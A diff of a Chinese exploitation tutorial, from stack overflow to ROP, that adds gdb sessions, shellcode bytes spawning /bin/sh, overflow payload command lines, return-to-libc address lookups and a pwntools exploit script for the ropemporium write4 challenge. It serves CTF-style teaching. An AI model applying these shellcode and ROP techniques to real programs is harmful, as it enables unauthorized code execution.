@@ -65,7 +65,9 @@ objdump -d shellcode反汇编结果如下
 
 上图方框部分就是编写的shellcode，提取这些指令的机器码如下：
 
-SHELLCODE = "\x31\xc0\x50...5"
+```
+SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+```
 
 - 测试提取后的shellcode
 
@@ -163,11 +165,11 @@ print(binascii.b2a_hex(pwn.asm(shellcode, arch='amd64')))
 #include <string.h>
 
 int main(int argc, char **argv) {
-  char buf[128];
-  if (argc < 2) return 1;
-    strcpy(buf, argv[1]);
-  printf("argv[1]: %s\n", buf);
-  return 0;
+        char buf[128];
+        if (argc < 2) return 1;
+        strcpy(buf, argv[1]);
+        printf("argv[1]: %s\n", buf);
+        return 0;
 }
 ```
 
@@ -207,7 +209,29 @@ int main(int argc, char **argv) {
 
 为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时指向的即是返回地址所在的位置。(也可以通过pwntools的cyclic函数或msf的pattern.py脚本生成一串字符串来定位溢出长度)
 
-![img](images/从栈溢出到ROP/bof1.png)
+```
+$ gdb -q --args bof AAAA
+Reading symbols from bof ... done.
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof AAAA
+argv[1]: AAAA
+[Inferior 1 (process 20815) exited normally]
+pwndbg> disassemble 
+Display all 200 possibilities? (y or n)
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x080484dc <+0>:    push   %ebp
+   0x080484dd <+1>:    mov    %ebp,%esp
+   ...
+   0x08048508 <+44>:   call   0x80483d0 <strcpy@plt>
+   ...
+   0x08048527 <+75>:   ret
+End of assembler dump.
+pwndbg> b *0x08048508                # 在strcpy断点
+Breakpoint 1 at 0x08048508
+pwndbg> b *0x08048527                # 在ret断点
+Breakpoint 2 at 0x08048527
+```
 
 在第一个断点处，找到缓冲区起始地址为0xffffd4a0
 
@@ -215,11 +239,42 @@ int main(int argc, char **argv) {
 
 二者相减，即可知道溢出超过140字节时会覆盖返回地址
 
-![img](images/从栈溢出到ROP/bof2.png)
+```
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof AAAA
+Breakpoint 1, 0x08048508 in main ()
+(gdb) x/2wx $esp
+0xffffd490:   0xffffd4a0   0xffffd734       # 分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffd4a0
+(gdb) c
+Continuing.
+argv[1]: AAAA
+Breakpoint 2, 0x08048527 in main ()
+(gdb) x/wx $esp
+0xffffd52c:   0xf7e1f637                    # 此处为返回地址
+(gdb) p/d 0xffffd52c - 0xffffd4a0           # 二者相减即可得到偏移
+$1 = 140
+```
 
 - 第一个栈溢出漏洞利用
 
-![img](images/从栈溢出到ROP/bof3.png)
+```
+$ cat /proc/sys/kernel/randomize_va_space
+0                                               # 降低难度，关闭系统地址随机化ASLR保护机制
+$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "BBBB"')               
+Reading symbols from ./bof...
+(No debugging symbols found in ./bof)
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof
+argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/20x $esp - 160
+0xffffd4a0:     0x080485c0      0xffffd4b0      0x000000c2      0xf7e9562b
+0xffffd4b0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd4c0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd4d0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd4e0:     0x41414141      0x41414141      0x41414141      0x41414141
+```
 
 输入140个A加4个B时，返回地址被改成了0x42424242
 
@@ -235,17 +290,39 @@ int main(int argc, char **argv) {
 
 最终成功执行shellcode获取了shell。
 
-![img](images/从栈溢出到ROP/bof4.png)
+
+
+```
+$ gdb -q --args ./bof $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * (140 - 24)+ "\xb0\xd4\xff\xff"')
+Reading symbols from ./bof...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+argv[1]: 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+process 21972 is executing new program: /bin/dash
+$ id
+uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
+$ 
+```
 
 - 在gdb外获取shell
 
 刚才成功利用是在gdb中运行，如果不使用gdb，直接运行，你会发现shellcode无法执行。
 
-实际上，在gdb中运行程序时，gdb会为进程正价许多环境变量，存储在栈上，导致栈用的更多，栈的地址变低了。直接运行时，栈地址会比gdb中高，所以刚才找的shellcode地址就不适用了。
+实际上，在gdb中运行程序时，gdb会为进程增加许多环境变量，存储在栈上，导致栈用的更多，栈的地址变低了。直接运行时，栈地址会比gdb中高，所以刚才找的shellcode地址就不适用了。
 
 将0xffffd4b0升高为0xffffd4ea，同时在shellcode前面增加长度为60的NOP链，只要命中任何一个NOP即可。
 
-![img](images/从栈溢出到ROP/bof5.png)
+```
+$ ./bof $(python -c 'print "\x90" * 60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * (140 - 60 - 24)+ "\xea\xd4\xff\xff"')                                            # 增加NOP Sled
+Reading symbols from ./bof...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+argv[1]: 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+process 21972 is executing new program: /bin/dash
+$ id
+uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
+$ 
+```
 
 
 
@@ -281,38 +358,134 @@ system返回时，栈上对应的返回地址为exit()函数，进而执行exit(
 
 可以在gdb中直接用print命令查看system和exit函数地址
 
-![img](images/从栈溢出到ROP/return_to_libc1.png)
+```
+$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "BBBB"')
+Reading symbols from ./bof...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /home/sh4rk/pwnable/bof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e3fd80 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e339b0 <__GI_exit>
+(gdb) 
+```
 
 - 查找glibc中字符串"/bin/sh"的地址
 
-   glibc中必定有字符串"/bin/sh"，可以使用gdb中find命令，在libc的内存范围内搜索。0xf7e05000是libc起始地址，0xf7fb8000是结尾。
+  glibc中必定有字符串"/bin/sh"，可以使用gdb中find命令，在libc的内存范围内搜索。0xf7e05000是libc起始地址，0xf7fb8000是结尾。
 
-  ![img](images/从栈溢出到ROP/return_to_libc2.png)
+  ```
+  (gdb) info proc mappings
+  process 22429
+  Mapped address spaces:
+      Start Addr  End Addr    Size   Offset objfile
+       0x8048000 0x8049000   0x1000    0x0 /home/sh4rk/pwnable/bof
+       0x8049000 0x804a000   0x1000    0x0 /home/sh4rk/pwnable/bof
+       0x804a000 0x806b000  0x21000    0x0 [heap]
+      0xf7e05000 0xf7fb4000  0x1af000    0x0 /lib/i386-linux-gnu/libc-2.23.so         # 起始地址 0xf7e05000
+      0xf7fb4000 0xf7fb5000   0x1000  0x1af000 /lib/i386-linux-gnu/libc-2.23.so
+      0xf7fb5000 0xf7fb7000   0x2000  0x1af000 /lib/i386-linux-gnu/libc-2.23.so
+      0xf7fb7000 0xf7fb8000   0x1000  0x1b1000 /lib/i386-linux-gnu/libc-2.23.so       # 结束地址 0xf7fb8000
+      ...
+      0xfffdd000 0xffffe000  0x21000    0x0 [stack]
+  (gdb) find /b 0xf7e05000, 0xf7fb8000, '/', 'b', 'i', 'n', '/', 's', 'h', 0
+  0xf7f60a3f
+  1 pattern found.
+  (gdb) x/s 0xf7f60a3f
+  0xf7f60a3f:   "/bin/sh"
+  (gdb) 
+  ```
 
 - 获取地址的另一种方法
   - 首先用ldd命令获取libc基址
   - 然后用readelf命令找到system和exit函数在libc中的偏移
   - 用strings命令找到字符串/bin/sh在libc中的偏移
   - 最后通过与libc基址相加来获得最终地址。
-
-![img](images/从栈溢出到ROP/return_to_libc3.png)
+  
+  ```
+  $ ldd bof
+          linux-gate.so.1 =>  (0xf7ffd000)
+          libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e05000)
+          /lib/ld-linux.so.2 (0x56555000)
+  $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+     ...
+   1457: 0003ab80  55 FUNC  WEAK  DEFAULT  13 system@@GLIBC_2.0
+     ...
+  $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+     ...
+    141: 0002e9b0  31 FUNC  GLOBAL DEFAULT  13 exit@@GLIBC_2.0
+     ...
+  $ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+   15ba3f /bin/sh
+  $ gdb -q
+  (gdb) p/x 0xf7e05000 + 0x0003ab80
+  $1 = 0xf7e3fd80
+  (gdb) p/x 0xf7e05000 + 0x0002e9b0
+  $2 = 0xf7e339b0
+  (gdb) p/x 0xf7e05000 + 0x15ba3f
+  $3 = 0xf7f60a3f
+  (gdb) 
+  ```
 
 把获得的system、exit、"/bin/sh"的地址填入溢出缓冲区，从前一课时计算到的偏移140之后开始填入。通过gdb运行发现shell并未启动，原因是："/bin/sh"的地址中包含换行符0a，argv[1]会被换行符截断。
 
-![img](images/从栈溢出到ROP/return_to_libc4.png)
+```
+$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "\x80\xfd\xe3\xf7" + "\xb0\x39\xe3\xf7" + "\x3f\x0a\xf6\xf7" + "\0\0\0\0"')           # "/bin/sh"地址中包含0x0a(\n)
+Reading symbols from ./bof...(no debugging symbols found)...done.
+(gdb) b *0x08048527
+Breakpoint 1 at 0x08048527
+(gdb) r
+argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+Breakpoint 1, 0x08048527 in main ()
+(gdb) x/20x $esp
+0xffffd51c:     0xf7e3fd80      0xf7e339b0      0xffff003f      0xffffd5c4  # 地址被截断为0xffff003f
+0xffffd52c:     0x00000000      0x00000000      0x00000000      0xf7fb7000
+...
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e3fd80 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e339b0 <__GI_exit>
+(gdb) 
+```
 
 这时候可以考虑更换命令字符串，使用"sh\0"，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个"sh"字符串，将其地址作为system()函数的参数即可。我们在程序自身空间内就可以找到"sh"这个字符串，同样使用find命令，实际上，此处的sh是".gnu.hash"这个字符串中的一部分。
 
-![img](images/从栈溢出到ROP/return_to_libc5.png)
+```
+(gdb) info proc mappings 
+process 29788
+Mapped address spaces:
+
+    Start Addr  End Addr    Size   Offset objfile
+     0x8048000 0x8049000   0x1000    0x0 /home/sh4rk/pwnable/bof
+     0x8049000 0x804a000   0x1000    0x0 /home/sh4rk/pwnable/bof
+     0x804a000 0x806b000   0x21000   0x0 [heap]
+(gdb) find /b 0x8048000, 0x8049000, 's', 'h', 0
+0x8048d79
+1 pattern found.
+(gdb) x/s 0x8048d79
+0x8048d79:   "sh"
+(gdb) x/s 0x8048d72
+0x8048d72:   ".gnu.hash"
+```
 
 - 第一个使用return to libc的exploit
 
 更换命令地址后，便可成功使用return to libc启动shell
 
-![img](images/从栈溢出到ROP/return_to_libc6.png)
+```
+$ ./bof $(python -c 'print "A" * 140 + "\x80\xfd\xe3\xf7" + "\xb0\x39\xe3\xf7" + "\x79\x8d\x04\x08" + "\0\0\0\0"')
+argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+$ id
+uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
+$ 
+```
 
 > 要使用'/bin/sh'等字符串也可以不用在libc或其他地方搜索，可以自己构造，通过ROP调用read等函数写在.bss段首地址即可，这里是全局变量的地方，地址固定方便定位，可以用于存储字符串等数据。
->
+
+> 另外这里通过命令行传入地址带0x20,0x0a等特殊字符被截断，除了可以尝试换用其他可选地址外，另一种简单做法是将相关参数放入双引号内
 
 ## return to plt
 
@@ -365,8 +538,6 @@ system返回时，栈上对应的返回地址为exit()函数，进而执行exit(
 
 
 
-
-
 - 常规ROP链布局
 
 x86 ROP链示意图：
@@ -388,7 +559,10 @@ x86 ROP链示意图：
 ```
 
 最简单的调用system("/bin/sh")的ROP链如下：
-ROP_CHAIN = system_ptr + exit_ptr + cmd_addr
+
+```
+ROP_CHAIN = system_ptr + exit_ptr + bin_sh_addr
+```
 
 x64:
 
@@ -450,22 +624,114 @@ pop3 ret可以在read/write函数返回时，清理栈上的参数，进而触�
   - pop rdi; ret
   - pop rsi; pop r15; ret;
   - 用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget
-
+  - 案例参考：**ropemporium write4**
+  
 - x64下通用Gadget: __libc_csu_init
   - 几乎所有的x64 ELF在__libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13,r14,r15,再通过第一个Gadget将这三个值分别送入rdx,rsi,edi中，正好涵盖了x64 cdecl调用约定下的前三个参数。
+  
   - 中间有几处关键的地方
   
     * 设置rbx为0(一般情况)
+    
     * 设置rbp为1
+  
+  - 案例参考：**ropemporium ret2csu**
 
-![img](images/从栈溢出到ROP/libc_csu.png)
+  ```
+      .text:0000000000400670 loc_400670:                             ; CODE XREF: __libc_csu_init+54↓j
+      .text:0000000000400670                 mov     rdx, r13
+      .text:0000000000400673                 mov     rsi, r14
+      .text:0000000000400676                 mov     edi, r15d
+      .text:0000000000400679                 call    qword ptr [r12+rbx*8]
+      .text:000000000040067D                 add     rbx, 1
+      .text:0000000000400681                 cmp     rbp, rbx
+      .text:0000000000400684                 jnz     short loc_400670
+      .text:0000000000400686
+      .text:0000000000400686 loc_400686:                             ; CODE XREF: __libc_csu_init+34↑j
+      .text:0000000000400686                 add     rsp, 8
+      .text:000000000040068A                 pop     rbx
+      .text:000000000040068B                 pop     rbp
+      .text:000000000040068C                 pop     r12
+      .text:000000000040068E                 pop     r13
+      .text:0000000000400690                 pop     r14
+      .text:0000000000400692                 pop     r15
+      .text:0000000000400694                 retn
+      .text:0000000000400694 __libc_csu_init endp
+  ```
+
+
 
 **案例：ropemporium write4**
 http://ropemporium.com/binary/write4.zip
 
-- 构造info leak代码段(如write、puts、printf等)
-- 计算lib_base
-- 构造第二次栈溢出，完成getshell操作
+> 该案例用于练习查找gadget控制寄存器和进一步控制写内存。
+>
+> 早期的write4还有一种解法如下，但已经不适用于最新版本，最新版本write4中没有可供leak的函数调用
+>
+> - 构造info leak代码段(如write、puts、printf等)
+>
+> - 计算lib_base
+>
+> - 构造第二次栈溢出，完成getshell操作
+
+```
+#!/usr/bin/env python
+# coding=utf-8
+
+from pwn import *
+
+context.log_level = 'debug'
+
+elf = ELF("./write4")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+pwnme_addr = 0x4007B5
+pop_rdi_ret = 0x400893
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+system_plt = elf.plt['system']
+
+puts_offset = libc.symbols['puts']
+binsh_offset = libc.search("/bin/sh").next()
+
+io = process("./write4")
+io.recvuntil(">")
+
+pay = ''
+pay += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'
+pay += p64(pop_rdi_ret)
+pay += p64(puts_got)
+pay += p64(puts_plt)
+pay += p64(pwnme_addr)
+
+# with open("payload","wb") as payload:
+# 	payload.write(pay)
+
+#gdb.attach(io)
+pause()
+io.sendline(pay)
+
+puts_addr = u64(io.recvuntil("Go")[1:7]+'\x00'*2)
+
+binsh_addr = (puts_addr-puts_offset)+binsh_offset
+
+log.info("puts_addr: 0x%x" % puts_addr)
+log.info("binsh_addr: 0x%x" % binsh_addr)
+
+io.recvuntil(">")
+
+pay = ''
+pay += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'
+pay += p64(pop_rdi_ret)
+pay += p64(binsh_addr)
+pay += p64(system_plt)
+pay += "B"*8
+
+
+io.sendline(pay)
+
+io.interactive()
+```
 
 **案例：ropemporium ret2csu**
 
@@ -1246,37 +1512,6 @@ echo 2 > /proc/sys/kernel/randomize_va_space
 
 
 #### ret2csu x64通用gadget查找
-
-x64架构下的ROP
-
-- arm64（64位)cdecl调用约定
-
-  - 使用寄存器rdi, rsi, rdx, rcx, r8, r9来传递前6个参数
-  - 第七个及以上的参数通过栈来传递
-
-- 参数在寄存器中，必须用gadget来设置参数
-
-  - pop rdi; ret
-
-  - pop rsi; pop r15; ret;
-
-  - 用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget
-    1). 案例：ropemporium write4
-    http://ropemporium.com/binary/write4.zip
-
-    - 构造info leak代码段(如write、puts、printf等)
-    - 计算lib_base
-    - 构造第二次栈溢出，完成getshell操作
-      2). x64下通用Gadget: __libc_csu_init
-    - 几乎所有的x64 ELF在__libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13,r14,r15,再通过第一个Gadget将这三个值分别送入rdx,rsi,edi中，正好涵盖了x64 cdecl调用约定下的前三个参数。
-
-    中间有几处关键的地方
-    1>. 设置rbx为0(一般情况)
-    2>. 设置rbp为1
-    案例：https://ropemporium.com/binary/ret2csu.zip
-    http://paste.ubuntu.com/p/BPZyHJ555f/
-
-
 
 程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），虽然很多程序的源码不同，但初始化的过程是相同的，针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要的效果。
 
@@ -2255,11 +2490,9 @@ payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
 
 - 【长亭科技PWN系列公开课程 #2从栈溢出开始，教你写shellcode和ROP链 2020.04.17 长亭科技安全研究员 郑吉宏】
 - ROP练习 https://ropemporium.com/
-
 - 【长亭科技PWN系列公开课程 #3小试牛刀 ROP实战 2020.04.24 长亭科技安全研究员 施伟铭】
-
 - https://bestwing.me/ropemporium-all-writeup.html
-
+- https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex
 - 讲师私货：
   https://hub.docker.com
   https://hub.docker.com/repository/docker/beswing/swpwn
